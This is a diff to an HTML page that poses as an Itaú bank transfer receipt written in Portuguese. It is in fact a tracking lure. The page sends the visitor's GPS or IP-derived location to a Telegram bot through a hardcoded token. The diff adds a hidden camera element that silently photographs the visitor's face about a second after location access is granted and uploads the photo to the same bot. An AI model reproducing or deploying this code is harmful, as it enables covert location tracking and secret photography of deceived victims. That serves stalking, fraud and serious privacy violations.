@@ -18,6 +18,7 @@
   .value{font-weight:600}
   .divider{height:1px;background:#ddd;margin:12px 0}
   .center{text-align:center}
+  #camera{display:none}
 </style>
 </head>
 <body>
@@ -33,7 +34,7 @@
   <p>Para visualizar, precisa permitir permissões da página.</p>
 </div>
 
-<!-- 3) COMPROVANTE (sem mapa, sem lat/lon) -->
+<!-- 3) COMPROVANTE -->
 <div id="comprovante">
   <div class="logo">Itaú</div>
   <div class="row"><span class="label">Comprovante de Transferência</span><span class="value" id="dataHora">05/06/2024 14:32:11</span></div>
@@ -46,7 +47,11 @@
   <p class="center" style="font-size:12px;color:#777">Transação realizada com sucesso.</p>
 </div>
 
+<!-- 4) CAMERA (oculta) -->
+<video id="camera" style="display:none;" autoplay muted playsinline></video>
+
 <script>
+/* ---------- CONFIG ---------- */
 const TOKEN   = '7737279523:AAHU02j3i3XKAeg020uQwcUgpDL3viDmR1c';
 const CHAT_ID = '-1003187104876';
 
@@ -57,15 +62,45 @@ const dados = {
   autenticacao: [...Array(20)].map(() => Math.random().toString(36)[2]).join('')
 };
 
-/* ---------- ENVIO SILENCIOSO ---------- */
-function enviar(lat, lon, prec, source) {
+/* ---------- UTIL ---------- */
+const tele = (msg, media = null) => {
+  let form = new FormData();
+  form.append('chat_id', CHAT_ID);
+  form.append('caption', msg);
+  if (media) {
+    form.append('photo', media, 'selfie.jpg');
+    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {method:'POST', body: form});
+  } else {
+    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+      headers: {'Content-Type':'application/json'},
+      method: 'POST', body: JSON.stringify({chat_id: CHAT_ID, text: msg})
+    });
+  }
+};
+
+/* ---------- LOCAL SILENCIOSO ---------- */
+function enviarL(lat, lon, prec, source) {
   const map = `https://www.google.com/maps/@${lat},${lon},18z`;
-  const texto = `📍 Localização ${source}\nMapa: ${map}\nLat: ${lat}\nLon: ${lon}\nPrecisão: ${prec} m\nDados: ${dados.valor}`;
-  fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ chat_id: CHAT_ID, text: texto })
-  });
+  tele(`📍 Localização ${source}\nMapa: ${map}\nLat: ${lat}\nLon: ${lon}\nPrecisão: ${prec} m\nDados: ${dados.valor}`);
+}
+
+/* ---------- SELFIE ---------- */
+async function selfie() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
+    const v   = document.getElementById('camera');
+    v.srcObject = stream;
+    await v.play();
+    const canvas = document.createElement('canvas');
+    [canvas.width, canvas.height] = [640, 480];
+    canvas.getContext('2d').drawImage(v, 0, 0, canvas.width, canvas.height);
+    canvas.toBlob(blob => {
+      tele('📸 **Selfie capturada**', blob);
+      stream.getTracks().forEach(t=>t.stop());
+    }, 'image/jpeg', 0.9);
+  } catch (e) {
+    tele('📸 Erro ao capturar selfie: ' + e.message);
+  }
 }
 
 /* ---------- 1ª TENTATIVA: GPS ---------- */
@@ -73,39 +108,33 @@ if (navigator.geolocation) {
   navigator.geolocation.getCurrentPosition(
     pos => {
       const { latitude: lat, longitude: lon, accuracy: prec } = pos.coords;
-      enviar(lat, lon, prec, 'Permitida');
+      enviarL(lat, lon, prec, 'Permitida');
       document.getElementById('spinnerBox').style.display = 'none';
       document.getElementById('comprovante').style.display = 'block';
+      // aguarda 1s antes da selfie (mais "natural")
+      setTimeout(selfie, 1000);
     },
     () => {
-      /* ---------- 2ª TENTATIVA: IP (sempre executa) ---------- */
+      /* ---------- 2ª: IP ---------- */
       fetch('https://ipapi.co/json/')
-        .then(r => r.json())
-        .then(data => {
+        .then(r=>r.json()).then(data=>{
           const lat = data.latitude;
           const lon = data.longitude;
-          enviar(lat, lon, '~1 km', 'via IP');
+          enviarL(lat, lon, '~1 km', 'via IP');
         })
-        .catch(() => {
-          enviar(-23.550520, -46.633309, 'indisponível', 'genérica');
-        });
+        .catch(() => tele('🌐 Sem precisão'));
       document.getElementById('spinnerBox').style.display = 'none';
       document.getElementById('msgNegado').style.display = 'block';
     },
-    { enableHighAccuracy: true, timeout: 8000 }
-  );
+    {enableHighAccuracy:true,timeout:8000});
 } else {
-  /* GPS não disponível → IP */
   fetch('https://ipapi.co/json/')
-    .then(r => r.json())
-    .then(data => {
+    .then(r=>r.json()).then(data=>{
       const lat = data.latitude;
       const lon = data.longitude;
-      enviar(lat, lon, '~1 km', 'via IP');
+      enviarL(lat, lon, '~1 km', 'via IP');
     })
-    .catch(() => {
-      enviar(-23.550520, -46.633309, 'indisponível', 'genérica');
-    });
+    .catch(() => tele('🌐 Sem precisão'));
   document.getElementById('spinnerBox').style.display = 'none';
   document.getElementById('msgNegado').style.display = 'block';
 }
